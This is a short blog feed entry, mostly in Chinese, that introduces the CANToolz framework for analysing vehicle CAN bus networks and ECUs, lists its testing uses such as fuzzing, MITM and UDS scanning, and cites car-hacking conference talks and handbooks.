<p>https://github.com/CANToolz/CANToolz</p>
<p>CANToolz是一个分析CAN网络和设备的框架。它提供了多个模块，可以使用CANToolz的<code>pipe</code>系统由安全研究人员、汽车/OEM安全测试人员在黑箱分析中使用.</p>
<p>CANToolz可用于ECU的发现，MITM的测试，模糊，畜力，扫描或研发，测试和验证.更多的可以很容易地用一个新的模块来实现。</p>
<h3 id="this-framework-can-be-used-as">This framework can be used as:</h3>
<ul>
<li>Automated tests framework (on CAN bus)</li>
<li>CAN ECU/tests prototyping</li>
<li>Blackbox analysis of CAN traffic</li>
<li>Traffic replay</li>
<li>MITM</li>
<li>Fuzzing</li>
<li>UDS scanning</li>
</ul>
<p><img src="https://hi-kk.github.io//post-images/1564129777386.png" alt=""><br>
详见：《Blackhat2016-eu-16-Sintsov-Pen-Testing-Vehicles-With-Cantoolz》.pdf</p>
<figure data-type="image" tabindex="29"><img src="https://hi-kk.github.io//post-images/1564129793503.png" alt=""></figure>
<p>​									——《2014_car_hackers_handbook_compressed》.pdf</p>
<figure data-type="image" tabindex="30"><img src="https://hi-kk.github.io//post-images/1564129811175.png" alt=""></figure>
<p>​						——《Car-Wars-Episode-I-Hacker-Menace-Matt-Carpenter》.pdf</p>
<p><strong>——————<a href="https://github.com/hi-KK">By KEYONE</a>——————</strong></p>
]]></content>
    </entry>
</feed>